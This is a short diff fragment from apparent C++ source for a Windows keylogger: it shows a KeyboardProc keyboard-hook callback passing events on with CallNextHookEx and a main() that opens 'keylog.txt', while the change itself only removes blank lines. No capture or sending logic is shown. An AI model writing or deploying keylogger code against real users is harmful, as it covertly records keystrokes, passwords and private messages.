@@ -24,8 +24,6 @@ LRESULT CALLBACK KeyboardProc(_In_ int code, _In_ WPARAM wParam, _In_ LPARAM lPa
 		return CallNextHookEx(kbh, code, wParam, lParam);
 }
 
-	
-
 int main (){
 	
 	textfile.open("keylog.txt", ios::out | ios::trunc);
